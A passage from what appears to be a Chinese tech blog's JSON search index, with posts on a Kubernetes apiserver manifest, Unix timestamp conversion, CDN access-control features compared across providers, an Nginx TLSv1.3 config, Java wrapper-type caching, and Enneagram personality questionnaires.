--tls-private-key-file=/etc/kubernetes/pki/apiserver.key\n    image: registry.aliyuncs.com/google_containers/kube-apiserver:v1.15.2\n    imagePullPolicy: IfNotPresent\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 192.168.26.10\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/ssl/certs\n      name: ca-certs\n      readOnly: true\n    - mountPath: /etc/pki\n      name: etc-pki\n      readOnly: true\n    - mountPath: /etc/kubernetes/pki\n      name: k8s-certs\n      readOnly: true\n  hostNetwork: true\n  priorityClassName: system-cluster-critical\n  volumes:\n  - hostPath:\n      path: /etc/ssl/certs\n      type: DirectoryOrCreate\n    name: ca-certs\n  - hostPath:\n      path: /etc/pki\n      type: DirectoryOrCreate\n    name: etc-pki\n  - hostPath:\n      path: /etc/kubernetes/pki\n      type: DirectoryOrCreate\n    name: k8s-certs\nstatus: {}\n```\n\n### 相关文档\n\n- [http://www.thinkcode.se/blog/2019/02/20/kubernetes-service-node-port-range](http://www.thinkcode.se/blog/2019/02/20/kubernetes-service-node-port-range)\n","categories":["Kubernetes"],"tags":["k8s","Kubernetes"]},{"title":"Linux/macOS 如何进行时间戳转换？","url":"/2020/05/timestamp/","content":"\n## 时间戳转换网站\n\n[https://tool.lu/timestamp/](https://tool.lu/timestamp/)\n\n<!--more-->\n![https://tool.lu/timestamp/](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-12%20下午2.08.09.png)\n\n[https://tool.chinaz.com/tools/unixtime.aspx](https://tool.chinaz.com/tools/unixtime.aspx)\n![https://tool.chinaz.com/tools/unixtime.aspx](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-12%20下午2.09.15.png)\n\n## Linux 时间戳转日期时间\n```shell\n# date -d @timestamp\n# date -d@timestamp\ndate -d @1574933006\ndate -d@1574933006\n```\n\n\n## macOS 时间戳转日期时间\n```shell\n# date -r timestamp\n# date -rtimestamp\ndate -r 1574933006\ndate -r1574933006\n```\n\n\n## 日期时间转时间戳\n\n目前没有特别好用的方法，还是去网站上转吧\n\n## Linux 获取当前时间戳\n\n\n```shell\ndate +%s\n```\n\n\n## macOS 获取当前时间戳\n\n\n```shell\ndate +%s\n```\n","categories":["技巧"],"tags":["timestamp"]},{"title":"CDN 的访问控制 & 视频相关","url":"/2020/07/cdn-about-security-and-video/","content":"\n\n\n## 1.Referer\n\n### 又拍云\n\nhttps://help.upyun.com/knowledge-base/cdn-referer-limite/\n\n### 七牛云\n\nhttps://developer.qiniu.com/fusion/manual/3839/domain-name-hotlinking-prevention\n\n### 腾讯云\n\nhttps://cloud.tencent.com/document/product/228/41454\n\n### 阿里云\n\nhttps://help.aliyun.com/document_detail/27134.html\n\n<!--more-->\n\n### AWS\n\n未找到相关文档\n\n## 2.回源鉴权（自定义接口）\n\n### 又拍云\n\nhttps://help.upyun.com/knowledge-base/cdn-back-source-auth/\n\n可添加多种鉴权配置\n\n资源地址 鉴权资源地址，如：www.example.com/a/*，仅支持在路径部分使用通配符 *\n\n鉴权服务器地址，格式： http://validate.example.com/app/cdnValidate\n\n请求方法支持 GET POST\n\n鉴权参数 URL 参数 支持最多20个\n\n鉴权成功 失败根据 http 状态码确定\n\n超时默认 通过 或 失败\n\n### 七牛云\n\nhttps://developer.qiniu.com/fusion/manual/3930/back-to-the-source-authentication\n\n**回源鉴权与时间戳防盗链功能不能同时开启。**\n\n**无法指定某些资源不参与鉴权。**\n\n鉴权服务器地址 格式： https://auth.example.com/cdnauth 或者 http://127.0.0.1:8080/cdnauth\n\n请求方法支持 HEAD GET POST\n\n鉴权参数 URL 参数 支持最多20个\n\n可以添加 不参加鉴权的 Header URL 参数 \n\n鉴权成功 失败根据 http 状态码确定\n\n超时默认 通过 或 失败\n\n### 腾讯云\n\n未找到相关文档\n\n### 阿里云\n\n未找到相关文档\n\n### AWS\n\n未找到相关文档\n\n## 3.URL Token鉴权\n\n### 又拍云 \n\nhttps://help.upyun.com/knowledge-base/cdn-token-limite/\n\n不支持指定文件类型，但是可以通过边缘规则实现自定义防盗链\n\nhttps://help.upyun.com/knowledge-base/cdn-edgerules-grammar/\n\nhttps://help.upyun.com/knowledge-base/cdn-edgerules-cases/\n\n### 七牛云\n\nhttps://developer.qiniu.com/fusion/manual/3841/timestamp-hotlinking-prevention-fusion\n\n不支持指定文件类型\n\n但是可以找客服。先开通时间戳防盗链功能，然后找客服，让他们去指定 ts 文件不鉴权。该功能目前暂未开放，只能找客服后台开启。\n\n### 腾讯云\n\nhttps://cloud.tencent.com/document/product/228/41622、\n\n支持指定文件类型\n\n### 阿里云\n\nhttps://help.aliyun.com/document_detail/85117.html\n\n不支持指定文件类型\n\n可以使用边缘脚本 EdgeScript 定制鉴权\n\nhttps://help.aliyun.com/document_detail/126565.html\n\nhttps://help.aliyun.com/document_detail/126571.html\n\n### AWS\n\n支持指定文件类型\n\n[使用签名 URL](https://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/private-content-signed-urls.html)\n\n[使用固定政策创建签名 URL](https://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/private-content-creating-signed-url-canned-policy.html)\n\n[使用自定义政策创建签名 URL](https://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/private-content-creating-signed-url-custom-policy.html)\n\n[使用 Java 创建 URL 签名](https://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/CFPrivateDistJavaDevelopment.html)\n\n## 4.视频拖拽\n\n### 又拍云\n\nhttps://help.upyun.com/knowledge-base/cdn-video-drag/\n\n### 七牛云\n\n未找到相关文档\n\n### 腾讯云\n\nhttps://cloud.tencent.com/document/product/228/8111\n\n### 阿里云\n\nhttps://help.aliyun.com/document_detail/27130.html\n\n可以实现音视频试看\n\nhttps://help.aliyun.com/document_detail/140382.html\n\n### AWS \n\n未找到相关文档\n\n\n\n## 5.刷新缓存\n\n### 又拍云\n\nhttps://help.upyun.com/knowledge-base/refresh/\n\nhttps://github.com/upyun/java-purge-sdk\n\n### 七牛云\n\nhttps://developer.qiniu.com/fusion/manual/3845/refresh-the-prefetch-fusion\n\nhttps://developer.qiniu.com/kodo/sdk/1239/java#9\n\n### 腾讯云\n\nhttps://cloud.tencent.com/document/product/228/11204\n\n### 阿里云\n\nhttps://help.aliyun.com/document_detail/27140.html\n\n### AWS\n\nhttps://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/Invalidation.html\n\nhttps://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Invalidation.html\n\n## 6.访问日志\n\n### 又拍云\n\nhttps://help.upyun.com/knowledge-base/cdm-log-download/\n\n### 七牛云\n\nhttps://developer.qiniu.com/fusion/manual/3847/cdn-log-fusion\n\n### 腾讯云\n\nhttps://cloud.tencent.com/document/product/228/6316\n\n### 阿里云\n\nhttps://help.aliyun.com/document_detail/27142.html\n\n###  AWS\n\nhttps://docs.aws.amazon.com/zh_cn/AmazonCloudFront/latest/DeveloperGuide/AccessLogs.html\n\nURL上的参数不在日志中\n\n## 101.总结\n\n### 防盗链\n\nReferer 设置最简单\n\nToken 鉴权  腾讯支持度最好，可以支持指定类型文件鉴权\n\n\n\n### 普通HLS加密\n\n当ts文件是开放（不需要鉴权）的情况下，用户可以直接下载ts文件，拼接出完整的视频，但是如果拿不到解密的key，仍然无法播放。\n\n这种方法不能防止直接使用 m3u8 下载的情况\n\n[HLS视频加密 - Hi, I'm Vimiix](https://www.vimiix.com/post/74/)\n\n[知识付费——移动端音视频加密、防盗播实现方案](https://segmentfault.com/a/1190000021126567)\n\n[通过HLS加密防止视频泄露](https://support.huaweicloud.com/bestpractice-vod/vod_10_0004.html)\n\n### 自定义HLS加密\n\nhttps://blog.csdn.net/z13192905903/article/details/102655575\n\n### 缓存刷新\n\n如果资源位置相同，重转后应刷新CDN\n\n","categories":["CDN"],"tags":["CDN","视频"]},{"title":"Nginx 配置 TLSv1.3","url":"/2020/07/nginx-tls1_3/","content":"\n## 1.Nginx 版本\n\n目前 Nginx 1.18 是默认支持的，低版本没有测试过。\n\n## 2.虚拟主机配置\n\n<!--more-->\n\n以 source.yonghong.me 为例\n\n```\nserver {\n    listen 443 ssl http2;\n    listen [::]:443 ssl http2;\n\n    server_name source.yonghong.me;\n\n\t\t# 抛弃老的协议，只保留 TLSv1.1 TLSv1.2 TLSv1.3\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    \n    # 需要配置符合PFS规范的加密套件，推荐配置\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!DH:!DHE;\n    # 配置 ssl_ciphers 后需要开启 ssl_prefer_server_ciphers\n    ssl_prefer_server_ciphers on;\n\n\t\t# 证书\n    ssl_certificate /etc/cert/live/yonghong.me/fullchain.pem;\n    ssl_certificate_key /etc/cert/live/yonghong.me/privkey.pem;\n    ssl_trusted_certificate  /etc/cert/live/yonghong.me/chain.pem;\n\n\t\t# HSTS（HTTP严格传输安全）的 max-age 需要大于15768000秒（半年）。\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n\n    location / {\n        proxy_pass http://sourcegraph:7080;\n    }\n}\n\nserver {\n    listen 80;\n    listen [::]:80;\n\n    server_name source.yonghong.me;\n\n    location / {\n        return 301 https://source.yonghong.me$request_uri;\n    }\n}\n```\n\n## 3.注意注意注意\n\n#### 如果开启了TLSv1.3，那么所有的虚拟主机都需要开启，否则开启会失败！！！\n\n#### 如果开启了TLSv1.3，那么所有的虚拟主机都需要开启，否则开启会失败！！！\n\n#### 如果开启了TLSv1.3，那么所有的虚拟主机都需要开启，否则开启会失败！！！\n\n### 4.检测\n\nhttps://myssl.com/\n\n![29-18-09-hWcQsy-MwhmVa](https://up-img.yonghong.tech/pic/2020/07/29-18-09-29-18-09-hWcQsy-MwhmVa-48nHB8.png)\n\n\n![29-18-10-8qSMAs-Dm7jsg](https://up-img.yonghong.tech/pic/2020/07/29-18-10-29-18-10-8qSMAs-Dm7jsg-hlQldx.png)\n\n\n![29-18-11-NJed9V-ymQV9n](https://up-img.yonghong.tech/pic/2020/07/29-18-11-29-18-11-NJed9V-ymQV9n-MMdQoT.png)","categories":["Nginx"],"tags":["Nginx","TLS"]},{"title":"Java基本数据类型以及缓存池","url":"/2020/10/java-ji-ben-shu-ju-lei-xing-yi-ji-huan-cun-chi/","content":"\n本文主要介绍了Java的8种数据类型和他们的封装类，封装类数值范围，封装类的缓存池。\n\n## 基本数据类型\n\n```\nbyte/8\nchar/16\nshort/16\nint/32\nfloat/32\nlong/64\ndouble/64\nboolean/~\n```\n\nboolean 只有两个值：true、false，可以使用 1 bit 来存储，但是具体大小没有明确规定。JVM 会在编译时期将 boolean 类型的数据转换为 int，使用 1 来表示 true，0 表示 false。JVM 支持 boolean 数组，但是是通过读写 byte 数组来实现的。\n\n<!-- more -->\n\n## 包装类型\n\n基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。\n\n```java\nInteger x = 2;     // 装箱 调用了 Integer.valueOf(2)\nint y = x;         // 拆箱 调用了 X.intValue()\n```\n\n## 数值范围\n\n| 类型 | 最大/小值 | 二进制 | 十进制 |\n| -- | -- | -- | -- |\n| Integer   | 最大值 | 0x7fffffff | 2 147 483 647 |\n| Integer   | 最小值 | 0x80000000 | -2 147 483 648 |\n| Long      | 最大值 | 0x7fffffffffffffffL | 9 223 372 036 854 775 807 |\n| Long      | 最小值 | 0x8000000000000000L | -9 223 372 036 854 775 808 |\n| Float     | 最大值 | 0x1.fffffeP+127f | 3.4028235e+38f |\n| Float     | 最小值 | 0x0.000002P-126f | 1.4e-45f |\n| Double    | 最大值 | 0x1.fffffffffffffP+1023 | 1.7976931348623157e+308 |\n| Double    | 最小值 | 0x0.0000000000001P-1022 | 4.9e-324 |\n\n\n另外 `java.math` 包中还有 `BigInteger` 和 `BigDecimal` 类型，基本上是任意精度的，极限就是你机器的上限。\n\n\n```java\n// 0x7fffffff = 2147483647\nSystem.out.println(Integer.MAX_VALUE);\n// 0x80000000 = -2147483648\nSystem.out.println(Integer.MIN_VALUE);\n\n// 0x7fffffffffffffffL = 9223372036854775807\nSystem.out.println(Long.MAX_VALUE);\n// 0x8000000000000000L = -9223372036854775808\nSystem.out.println(Long.MIN_VALUE);\n\n// 0x1.fffffeP+127f = 3.4028235e+38f\nSystem.out.println(Float.MAX_VALUE);\n// 0x0.000002P-126f = 1.4e-45f\nSystem.out.println(Float.MIN_VALUE);\n\n// 0x1.fffffffffffffP+1023 = 1.7976931348623157e+308\nSystem.out.println(Double.MAX_VALUE);\n// 0x0.0000000000001P-1022 = 4.9e-324\nSystem.out.println(Double.MIN_VALUE);\n```\n\n## 缓存池\n\n基本类型对应的缓冲池如下：\n\n- boolean values true and false\n- all byte values\n- short values between -128 and 127\n- int values between -128 and 127\n- char in the range \\u0000 to \\u007F\n\n在使用这些基本类型对应的包装类型时，如果该数值范围在缓冲池范围内，就可以直接使用缓冲池中的对象。\n\n在 jdk 1.8 所有的数值类缓冲池中，Integer 的缓冲池 IntegerCache 很特殊，这个缓冲池的下界是 - 128，上界默认是 127，但是这个上界是可调的，在启动 jvm 的时候，通过 -XX:AutoBoxCacheMax=<size> 来指定这个缓冲池的大小，该选项在 JVM 初始化的时候会设定一个名为 java.lang.IntegerCache.high 系统属性，然后 IntegerCache 初始化的时候就会读取该系统属性来决定上界。\n\n### Byte\n\n```java\n    private static class ByteCache {\n        private ByteCache(){}\n\n        static final Byte cache[] = new Byte[-(-128) + 127 + 1];\n\n        static {\n            for(int i = 0; i < cache.length; i++)\n                cache[i] = new Byte((byte)(i - 128));\n        }\n    }\n    \n    public static Byte valueOf(byte b) {\n        final int offset = 128;\n        return ByteCache.cache[(int)b + offset];\n    }\n```\n\n### Character\n\n```java\n    private static class CharacterCache {\n        private CharacterCache(){}\n\n        static final Character cache[] = new Character[127 + 1];\n\n        static {\n            for (int i = 0; i < cache.length; i++)\n                cache[i] = new Character((char)i);\n        }\n    }\n    \n    public static Character valueOf(char c) {\n        if (c <= 127) { // must cache\n            return CharacterCache.cache[(int)c];\n        }\n        return new Character(c);\n    }\n```\n\n### Short\n\n```java\n    private static class ShortCache {\n        private ShortCache(){}\n\n        static final Short cache[] = new Short[-(-128) + 127 + 1];\n\n        static {\n            for(int i = 0; i < cache.length; i++)\n                cache[i] = new Short((short)(i - 128));\n        }\n    }\n    \n    public static Short valueOf(short s) {\n        final int offset = 128;\n        int sAsInt = s;\n        if (sAsInt >= -128 && sAsInt <= 127) { // must cache\n            return ShortCache.cache[sAsInt + offset];\n        }\n        return new Short(s);\n    }\n```\n\n### Integer\n\n```java\n    private static class IntegerCache {\n        static final int low = -128;\n        static final int high;\n        static final Integer[] cache;\n        static Integer[] archivedCache;\n\n        static {\n            // high value may be configured by property\n            int h = 127;\n            String integerCacheHighPropValue =\n                VM.getSavedProperty(\"java.lang.Integer.IntegerCache.high\");\n            if (integerCacheHighPropValue != null) {\n                try {\n                    int i = parseInt(integerCacheHighPropValue);\n                    i = Math.max(i, 127);\n                    // Maximum array size is Integer.MAX_VALUE\n                    h = Math.min(i, Integer.MAX_VALUE - (-low) -1);\n                } catch( NumberFormatException nfe) {\n                    // If the property cannot be parsed into an int, ignore it.\n                }\n            }\n            high = h;\n\n            // Load IntegerCache.archivedCache from archive, if possible\n            VM.initializeFromArchive(IntegerCache.class);\n            int size = (high - low) + 1;\n\n            // Use the archived cache if it exists and is large enough\n            if (archivedCache == null || size > archivedCache.length) {\n                Integer[] c = new Integer[size];\n                int j = low;\n                for(int k = 0; k < c.length; k++)\n                    c[k] = new Integer(j++);\n                archivedCache = c;\n            }\n            cache = archivedCache;\n            // range [-128, 127] must be interned (JLS7 5.1.7)\n            assert IntegerCache.high >= 127;\n        }\n\n        private IntegerCache() {}\n    }\n    \n    public static Integer valueOf(int i) {\n        if (i >= IntegerCache.low && i <= IntegerCache.high)\n            return IntegerCache.cache[i + (-IntegerCache.low)];\n        return new Integer(i);\n    }\n```\n\n### Long\n\n```java\n    private static class LongCache {\n        private LongCache(){}\n\n        static final Long cache[] = new Long[-(-128) + 127 + 1];\n\n        static {\n            for(int i = 0; i < cache.length; i++)\n                cache[i] = new Long(i - 128);\n        }\n    }\n    \n    public static Long valueOf(long l) {\n        final int offset = 128;\n        if (l >= -128 && l <= 127) { // will cache\n            return LongCache.cache[(int)l + offset];\n        }\n        return new Long(l);\n    }\n```\n\n","categories":["学习笔记"],"tags":["Java","基本数据累心","包装类","封装类","缓存池"]},{"title":"解密九型人格读书笔记（1） | 九型人格简易测试表","url":"/2020/10/jiu-xing-ren-ge-001/","content":"\n这个测量表能帮助你在很短的时间内，初步判断你属于九型人格中的哪个类型。这里共有108个性格描述，纪录下你认为符合你的性格描述的题号，并参考最底部的题号分类，统计出你拥有的哪个性格类型的描述最多。统计的结果只是一个参考的结论，更准确的判断还需要对九型人格进行深入了解和揣摩分析后才能获得。\n　　1．我很容易迷惑。\n　　2．我不想成为一个喜欢批评的人，但很难做到。\n　　3．我喜欢研究宇宙的道理、哲理。\n　　4．我很注意自己是否年轻，因为那是我找乐子的本钱。\n　　5．我喜欢独立自主，一切都靠自己。<!-- more -->\n　　6．当我有困难的时候，我会试着不让人知道。\n　　7．被人误解对我而言是一件十分痛苦的事。\n　　8．施舍比接受会给我更大的满足感。\n　　9．我常常试探考验朋友或伴侣的忠诚。\n　　10．我常常设想最糟糕的结果而使自己陷入苦恼中。\n　　11．我看不起那些不像我一样坚强的人，有时我会用种种方式羞辱他们。\n　　12．身体上的舒适对我非常重要。\n　　13．我能触碰生活中的悲伤和不幸。\n　　14．别人不能完成他的分内事，会令我感到失望和愤怒。\n　　15．我时常拖延问题，不去解决。\n　　16．我喜欢有戏剧性、多彩多姿的生活。\n　　17．我认为自己非常不完善。\n　　18．我对感官的需求特别强烈，喜欢美食、服装、身体的触觉刺激，并纵情享乐。\n　　19．当别人请教我一些问题，我会事无巨细地分析得很清楚。\n　　20．我习惯推销自己，从不觉得难为情。\n　　21．有时我会放纵自己，做出不理智的事情。\n　　22．帮助不到别人会让我觉得痛苦。\n　　23．我不喜欢人家问我广泛、笼统的问题。\n　　24．在某方面我有放纵的倾向（例如食物、药物等）。\n　　25．我宁愿适应别人，包括我的伴侣，而不会反抗他们。\n　　26．我最不喜欢的一件事就是虚伪。\n　　27．我知错能改，但由于执著好强，周围的人还是感觉到有压力。\n　　28．我常觉得很多事情都很好玩，很有趣，人生真是快乐。\n　　29．我有时很欣赏自己充满权威，有时却又优柔寡断，依赖别人。\n　　30．我习惯付出多于接受。\n　　31．面对威胁时，我一是变得焦虑，一是对抗迎面而来的危险。\n　　32．我通常是等别人来接近我，而不是我去接近他们。\n　　33．我喜欢当主角，希望得到大家的注意。\n　　34．别人批评我，我也不会回应和解释，因为我不想发生任何争执与冲突。\n　　35．我有时期待别人的指导，有时却忽略别人的忠告，径直去做我想做的事。\n　　36．我经常忘记自己的需要。\n　　37．在重大危机中，我通常能克服我对自己的质疑和内心的焦虑。\n　　38．我是一个天生的推销员，说服别人对我来说是一件容易的事。\n　　39．我不相信一个我一直都无法了解的人。\n　　40．我爱依惯例行事，不大喜欢改变。\n　　41．我很在乎家人，在家中表现得忠诚和包容。\n　　42．我被动而优柔寡断。\n　　43．我很有包容力，彬彬有礼，但跟人的感情互动不深。\n　　44．我沉默寡言，好像不会关心别人似的。\n　　45．当沉浸在工作中或我擅长的领域时，别人会觉得我冷酷无情。\n　　46．我常常保持警觉。\n　　47．我不喜欢要对人尽义务的感觉。\n　　48．如果不能完美地表态，我宁愿不说。\n　　49．我的计划比我实际完成的还要多。\n　　50．我野心勃勃，喜欢挑战和登上高峰的滋味。\n　　51．我倾向于独断专行并自己解决问题。\n　　52．我很多时候感到被遗弃。\n　　53．我常常表现得十分忧郁的样子，充满痛苦而且内向。\n　　54．初见陌生人时，我会表现得很冷漠、高傲。\n　　55．我的面部表情严肃而生硬。\n　　56．我很飘忽，常常不知自己下一刻想要什么。\n　　57．我常对自己挑剔，期望不断改正自己的缺点，以成为一个完美的人。\n　　58．我非常敏感，并经常怀疑那些总是很快乐的人。\n　　59．我做事有效率，会找捷径，模仿力特强。\n　　60．我讲理，注重实用。\n　　61．我有很强的创造天分和想象力，喜欢将事情重新整合。\n　　62．我不要求得到很多的注意力。\n　　63．我喜欢每件事情都井然有序，但别人会以为我过分执著。\n　　64．我渴望有完美的心灵伴侣。\n　　65．我常夸耀自己，对自己的能力十分有信心。\n　　66．如果周遭的人行为太过分，我准会让他难堪。\n　　67．我外向，精力充沛，喜欢不断追求成就，这使我的自我感觉十分良好。\n　　68．我是一位忠实的朋友和伙伴。\n　　69．我知道如何让别人喜欢我。\n　　70．我很少看到别人的功劳和好处。\n　　71．我很容易看到别人的功劳和好处。\n　　72．我嫉妒心强，喜欢跟别人比较。\n　　73．我对别人做的事总是不放心，批评一番后，自己会动手再做。\n　　74．别人会说我常带着面具做人。\n　　75．有时我会激怒对方，引来莫名其妙的吵架，其实我是想试探对方爱不爱我。\n　　76．我会极力保护我所爱的人。\n　　77．我常常刻意保持兴奋的情绪。\n　　78．我只喜欢与有趣的人为友，对一些闷蛋却懒得交往，即使他们看起来很有深度。\n　　79．我常往外跑，四处帮助别人。\n　　80．我有时会讲求效率而牺牲完美和原则。\n　　81．我似乎不太懂得幽默，没有弹性。\n　　82．我待人热情而有耐性。\n　　83．在人群中我时常感到害羞和不安。\n　　84．我喜欢效率，讨厌拖泥带水。\n　　85．帮助别人达致快乐和成功是我最重要的成就。\n　　86．付出时，别人若不欣然接受，我便会有挫折感。\n　　87．我的肢体硬邦邦的，不习惯别人热情的付出。\n　　88．我对大部分的社交集会不太有兴趣，除非那是我熟识的和喜爱的人。\n　　89．很多时候我会有强烈的寂寞感。\n　　90．人们很乐意向我表白他们所遭遇的问题。\n　　91．我不但不会说甜言蜜语，而且别人会觉得我唠叨不停。\n　　92．我常担心自由被剥夺，因此不爱讲承诺。\n　　93．我喜欢告诉别人我所做的事和所知的一切。\n　　94．我很容易认同别人为我所做的事和所知的一切。\n　　95．我要求光明正大，为此不惜与人发生冲突。\n　　96．我很有正义感，有时会支持不利的一方。\n　　97．我注重小节而效率不高。\n　　98．我容易感到沮丧和麻木更多于愤怒。\n　　99．我不喜欢那些侵略性或过度情绪化的人。\n　　100．我非常情绪化，一天的喜怒哀乐多变。\n　　101．我不想别人知道我的感受与想法，除非我告诉他们。\n　　102．我喜欢刺激和紧张的关系，而不是确定和依赖的关系。\n　　103．我很少用心去听别人的心情，只喜欢说说俏皮话和笑话。\n　　104．我是循规蹈矩的人，秩序对我十分有意义。\n　　105．我很难找到一种我真正感到被爱的关系。\n　　106．假如我想要结束一段关系，我不是直接告诉对方就是激怒他来让他离开我。\n　　107．我温和平静，不自夸，不爱与人竞争。\n　　108．我有时善良可爱，有时又粗野暴躁，很难捉摸。\n\n--- \n\n　　◇测试答案\n　　1号型人格完美型：2，14，55，57，60，63，73，81，87，91，97，102，104，106。\n　　2号型人格助人型：6，8，22，30，69，71，79，82，85，86，89，90。\n　　3号型人格成就型：20，33，38，59，65，67，70，72，74，77，80，93。\n　　4号型人格自我型：7，13，17，52，53，54，56，58，61，64，100，105。\n　　5号型人格理智型：3，19，23，32，42，43，47，48，51，83，88，99，101。\n　　6号型人格疑惑型：9，10，26，29，31，35，37，45，46，68，75。\n　　7号型人格活跃型：4，16，18，21，28，49，78，92，103。\n　　8号型人格领袖型：5，11，24，27，40，44，50，66，76，84，95，96。\n　　9号型人格平和型：1，12，15，25，34，36，39，41，62，94，98，107，108。","categories":["读书笔记"],"tags":["读书笔记","心理学","九型人格"]},{"title":"解密九型人格读书笔记（2） | 根据描述测试九型人格","url":"/2020/10/jiu-xing-ren-ge-002/","content":"\n请阅读以下九段文字，根据描述，看看哪一段文字最能形容你。\n\n\n　　1．我对事物的态度是宁为玉碎，不为瓦全；尤其是对我认为重要的事情更是如此。\n　　我非常重视坚强、诚实、独立这些特质。我认为只有在东西出现眼前时，才算是真正拥有。在证明别人值得信赖之前，我不会轻易相信任何人。我喜欢别人用直接的态度对待我。我可以看出别人的不坦诚、说谎，或是想要对我不利的企图。我难以忍受别人的缺点，除非我可以了解这些缺点的产生的原因，或是我知道他们尝试改进，我才会改变自己的想法。如果我不尊重或不同意某个掌握权力的人，我就很难接受他的命令或指示。我很能照顾自己。当我生气的时候很难掩盖自己的情绪。我总是维护自己深爱的人或朋友，尤其是当他们受到不公平的对待时，我就会挺身而出。我不一定会参与每场竞争，不过我会证明自己有足以与他人匹敌的能力。<!-- more -->\n　　2．我用高标准的眼光看待事物，而且我希望自己可以达到这些标准。\n　　我很容易看出错误的所在，也知道如何改正。人们会认为我是吹毛求疵或是要求完美，其实，这只是因为我无法忍受事情没有依照正确的方式完成。当我可以负责某些事情时，我会感到自豪，而且我保证可以做得非常好。当别人没有努力把事情做好，或是做出不负责任、不公平的举动时，我会感到生气，但我会努力不表现出生气的样子。我认为人生应该先苦后乐，为了工作我可以牺牲个人需要。\n　　3．我可以轻易地觉察不同的观点。\n　　有时候我很难做出决定，因为我总是可以看出事情的正反两面以及优缺点。觉察不同观点的能力让我可以帮助抱持不同意见的人消除歧见。我比较可以了解他人的处境、诉求和个人需要，更甚于了解自己的需要。有时候在进行重要的事情时，我会被琐碎的小事吸引而分心。我很难决定什么是最重要的事，经常为了避免冲突而顺从别人的需要。旁人觉得我很好相处，容易取悦，很容易同意别人的看法。我很难直接表现出对某人的愤怒。我希望生活是很舒服、和谐的，也希望被别人接纳。\n　　4．我很能体会别人的感受，即使是不认识的人，我也可以看出他们的需要。\n　　有时候，我会觉得可以了解别人的需要是一件痛苦的事，特别是当他们痛苦或不开心的时候。我很容易奉献自己，有时我希望我可以说“不”，因为我往往会为别人做得太多，为自己做得太少。如果别人觉得我想要设计或是控制他们，我会觉得很难过，因为我只不过是想要了解和帮助他们。当别人不重视我或不体谅我的时候，我会变得情绪化和过于苛求。我觉得良好的人际关系很重要，我也愿意尽一切的努力和别人维持和谐的关系。\n　　5．不论是什么事情，我都要做到最好，这便是我做事时的强烈动机。\n　　我已经因为我的成就得到了许多的赞美和肯定，我完成了许多成就，而且我做什么总是能够成功的。我非常认同自己做的事，我认为一个人的价值在于他达到的成就，还有这些成就赢得的赞赏。为了把事情做好，我必须花费大部分的时间，因此我会把自己的感觉和需要放在次要的位置上，以把事情做好。因为我总是可以找到事情做，所以安静地坐着对我来说很困难。如果别人浪费我的时间，我会很不耐烦。如果有人做事的速度太慢，我会很希望把他的工作接过来做。我希望在任何领域都保持领先。虽然我爱竞争，但我在团体中也会做个合作的队员。\n　　6．我是一个安静、好分析的人。我比其他人需要多一点的独处时间。\n　　我比较喜欢在一旁观察，胜过于参与身边的活动。我不喜欢别人对我要求太多，或希望我表达我的感受。我在独处的时候比较可以了解自己的感受。我比较喜欢回味过去的经验，胜过于实际去经历。我在独处时不会觉得无聊，因为我有丰富的精神生活。我认为我应该把时间和精力保留在单纯、简单、尽量不贫乏的生活上。\n　　7．我有丰富的想象力，而且常常忍不住会联想到可能危及安全的事，结果让自己担忧不已。\n　　我通常都可以看出危险所在，并且感到非常害怕，好像这些危险真的会发生一样。我在处理危险时有两极化的表现：要不就是避免所有可能的危险，要不就是勇往直前地挑战这些危险。丰富的想象力让我头脑灵活，拥有风格独特的幽默感。我希望生活可以十分稳定，但是我经常会怀疑周遭的人、事、物。我经常可以看出别人在观念上的缺点，有些人会觉得我很狡猾。我倾向于质疑权威，也不太习惯处在权威的地位。我可以看出问题的所在，所以能够理解失败者的感受；一旦我决定要效忠于某个人或理想，我便会非常忠诚。\n　　8．我是一个乐观的人，喜欢参与新奇有趣的活动。\n　　我的思考很活跃，经常有不同的想法，喜欢让不同的观念产生关联；当我可以让本来没有关系的概念产生关联时，我会觉得非常兴奋。我喜欢把大部分的精力投注在感兴趣的事物上，不喜欢没有回报或反复做同一件事。我喜欢参与计划的起步阶段，因为在计划的过程当中，可以考虑很多有趣的选择。如果对正在进行的事情失去兴趣，我就会转移目标，改做其他比较有趣的事。如果某件事情进行得不顺利，我会将注意力转移到其他有趣的事情上。我认为人应该享受人生。\n　　9．我是一个感情强烈又敏感的人。\n　　我觉得自己和其他人不一样，所以常常会觉得不被了解，而感觉孤单。别人可能会觉得我的表现过于戏剧化，也曾经有人批评我太过敏感，过度放大自己的感觉。其实我想要的是紧密的感情联系和深入的人际关系。我对于目前的人际关系感到不满，因为我总是想得到自己无法拥有的东西，却厌恶自己拥有的东西。我时常因为缺少感情联系而感到忧郁沮丧。有时候我怀疑别人拥有的东西比我多，我觉得别人的人际关系比较好，他们的生活也比我快乐。我有敏锐的审美观。我的生活充满丰富的情感与深度的内涵。\n\n---\n\n　　◇测试答案\n　　1．8号型人格领袖型。\n　　2．1号型人格完美型。\n　　3．9号型人格平和型。\n　　4．2号型人格助人型。\n　　5．3号型人格成就型。\n　　6．5号型人格理智型。\n　　7．6号型人格疑惑型。\n　　8．7号型人格活跃型。\n　　9．4号型人格自我型。","categories":["读书笔记"],"tags":["读书笔记","心理学","九型人格"]},{"title":"解密九型人格读书笔记（3） | 九型人格测试问卷","url":"/2020/10/jiu-xing-ren-ge-003/","content":"\n看一看哪种类型回答“是”的次数最多呢？如果有两个以上类型答“是”的次数一样多，就要注意对于答“否”的题的拒绝强度，强烈拒绝的较少的类型，很可能就是你的类型。\n\n　　◎1号型人格完美型\n　　